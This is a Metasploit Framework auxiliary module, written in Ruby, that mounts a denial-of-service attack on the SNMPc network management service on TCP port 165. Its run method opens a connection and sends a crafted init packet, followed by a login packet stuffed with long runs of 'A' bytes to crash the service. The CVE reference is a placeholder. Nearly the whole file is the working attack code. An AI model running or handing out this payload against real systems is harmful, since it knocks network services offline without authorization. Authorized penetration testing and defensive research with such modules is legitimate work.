##
# $Id: snmpc.rb  2007-06-03  $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Auxiliary::Dos::Windows::Snmpc < Msf::Auxiliary

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'SNMPc ',
			'Description'    => %q{
				This module sends a specially-crafted packet to the service login of snmpc 
				causing a denial of service of snmpc.
			},
			'Author'         => [ 'En Douli, Tks to OaiTeam <DouliEn@gmail.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 1 $',
			'References'     =>
				[
					[ 'CVE', 'XXXXXXX' ],
				]))
			
			register_options([Opt::RPORT(165),], self.class)
	end

	def run
		connect
		init = "\x14\x00\x00\x00\x70\xa9\x00\x00\x51\x03\x00\x00\x02\x00\x00\x00\x72\x63\x6f\x6e"
		pkt = "\x29\x00\x00\x00\xbc\xee\x00\x00\x52\x03\x00\x00\x02\x00\x00\x00\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74"
		pkt << "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" * 56
		pkt << "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x09"
		pkt << "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" * 35
		pkt <<	 "\x41\x41\x41\x41\x41\x41\x41\x41\x09\x30\x00"
		
		print_status("Sending dos packet ... ")
		
		sock.put(init)
		sock.put(pkt)
		
		disconnect
	end

end
end	
